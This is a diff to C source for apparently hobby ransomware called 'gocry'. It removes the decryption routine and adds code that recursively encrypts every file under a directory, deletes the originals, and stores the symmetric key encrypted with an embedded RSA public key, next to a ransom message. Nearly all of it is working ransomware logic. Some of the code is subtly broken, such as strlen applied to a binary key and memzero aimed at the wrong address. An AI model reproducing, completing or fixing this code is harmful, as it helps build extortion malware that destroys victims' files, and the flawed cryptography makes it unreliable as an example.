@@ -8,7 +8,9 @@
 #include <openssl/pem.h>
 #include <openssl/rsa.h>
 #include <sodium.h>
+#include <sodium/crypto_secretbox_xchacha20poly1305.h>
 #include <sodium/crypto_secretstream_xchacha20poly1305.h>
+#include <sodium/utils.h>
 #include <stdio.h>
 #include <string.h>
 #include <sys/socket.h>
@@ -17,7 +19,7 @@
 #define CHUNK_SIZE  4096
 #define RSA_KEY_LEN 2048
 
-const char *root_dir_path = "./test";
+char *root_dir_path = "./test_dir";
 const char *ransom_message = "You've been infected by gocry.\nAll your files are not encrypted\n";
 
 /* Embedded file: public-key.pem */
@@ -90,85 +92,47 @@ static int encrypt(const char *encrypt_to, const char *source_file,
     return 0;
 }
 
-static int decrypt(const char *to_encrypt, const char *source_file,
-                   const unsigned char key[crypto_secretstream_xchacha20poly1305_KEYBYTES]) {
-    unsigned char buf_in[CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES];
-    unsigned char buf_out[CHUNK_SIZE];
-    unsigned char header[crypto_secretstream_xchacha20poly1305_HEADERBYTES];
-    crypto_secretstream_xchacha20poly1305_state st;
-    FILE *fp_t, *fp_s;
-    unsigned long long out_len;
-    size_t rlen;
-    int eof;
-    int ret = -1;
-    unsigned char tag;
+unsigned char enc_key[crypto_secretbox_xchacha20poly1305_KEYBYTES];
+void encryptRecursively(char *basePath) {
+    char path[1000];
+    struct dirent *dp;
+    DIR *dir = opendir(basePath);
 
-    fp_s = fopen(source_file, "rb");
-    fp_t = fopen(to_encrypt, "wb");
-    fread(header, 1, sizeof header, fp_s);
-    if (crypto_secretstream_xchacha20poly1305_init_pull(&st, header, key) != 0) {
-        goto ret;
+    // Unable to open directory stream
+    if (!dir)
+        return;
+
+    while ((dp = readdir(dir)) != NULL) {
+        if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0) {
+            char filename[256] = {0};
+
+            strcpy(path, basePath);
+            strcat(path, "/");
+            strcat(path, dp->d_name);
+            snprintf(filename, 255, "%s/%s.ccry", root_dir_path, path);
+
+            if (encrypt(filename, path, enc_key) != 0)
+                printf("Error encrypting file %s", enc_key);
+
+            // after the file has been ecrypted delete it.
+            int r = remove(path);
+            if (r != 0) {
+                printf("error deleting file after encryption\n");
+            }
+
+            encryptRecursively(path);
+        }
     }
-    do {
-        rlen = fread(buf_in, 1, sizeof buf_in, fp_s);
-        eof = feof(fp_s);
-        if (crypto_secretstream_xchacha20poly1305_pull(&st, buf_out, &out_len, &tag, buf_in, rlen, NULL, 0) !=
-            0) {
-            goto ret;
-        }
-        if (tag == crypto_secretstream_xchacha20poly1305_TAG_FINAL && !eof) {
-            goto ret;
-        }
-        fwrite(buf_out, 1, (size_t)out_len, fp_t);
-    } while (!eof);
 
-    ret = 0;
-ret:
-    fclose(fp_t);
-    fclose(fp_s);
-    return ret;
+    closedir(dir);
 }
 
 int main(void) {
     if (sodium_init() < 0)
         exit(EXIT_FAILURE);
 
-    DIR *root_dir = opendir(root_dir_path);
-    struct dirent *dir;
-
-    char *to_encrypt[512];
-    int i = 0;
-
-    if (root_dir) {
-        while ((dir = readdir(root_dir)) != NULL) {
-            if (!strcmp(dir->d_name, ".") || !strcmp(dir->d_name, "..")) {
-                continue;
-            }
-            puts(dir->d_name);
-            to_encrypt[i] = dir->d_name;
-            ++i;
-        }
-        closedir(root_dir);
-    }
-
-    unsigned char encryption_key[crypto_secretstream_xchacha20poly1305_KEYBYTES];
-    crypto_secretstream_xchacha20poly1305_keygen(encryption_key);
-    for (int j = 0; j < i; ++j) {
-        char filename[256] = {0};
-        char original[256] = {0};
-
-        snprintf(filename, 255, "%s/%s.ccry", root_dir_path, to_encrypt[j]);
-        snprintf(original, 255, "%s/%s", root_dir_path, to_encrypt[j]);
-
-        if (encrypt(filename, original, encryption_key) != 0)
-            printf("Error encrypting file %s", to_encrypt[j]);
-
-        // after the file has been ecrypted delete it.
-        int r = remove(original);
-        if (r != 0) {
-            printf("error deleting file after encryption\n");
-        }
-    }
+    crypto_secretstream_xchacha20poly1305_keygen(enc_key);
+    encryptRecursively(root_dir_path);
 
     EVP_PKEY *pkey;
     BIO *pubkey_bio = BIO_new_mem_buf(file, fsize);
@@ -185,11 +149,13 @@ int main(void) {
 
     char *encrypted_key = (char *)malloc(RSA_size(rsa));
     int len;
-    if ((len = RSA_public_encrypt(strlen((const char *)encryption_key) + 1, (unsigned char *)encryption_key,
+    if ((len = RSA_public_encrypt(strlen((const char *)enc_key) + 1, (unsigned char *)enc_key,
                                   (unsigned char *)encrypted_key, rsa, RSA_PKCS1_OAEP_PADDING)) == -1) {
         printf("error encrypting keys");
         return 1;
     }
+
+    sodium_memzero(&encrypted_key, crypto_secretbox_xchacha20poly1305_KEYBYTES);
     FILE *out = fopen("./key.txt", "w");
     fwrite(encrypted_key, sizeof(*encrypted_key), RSA_size(rsa), out);
     fclose(out);
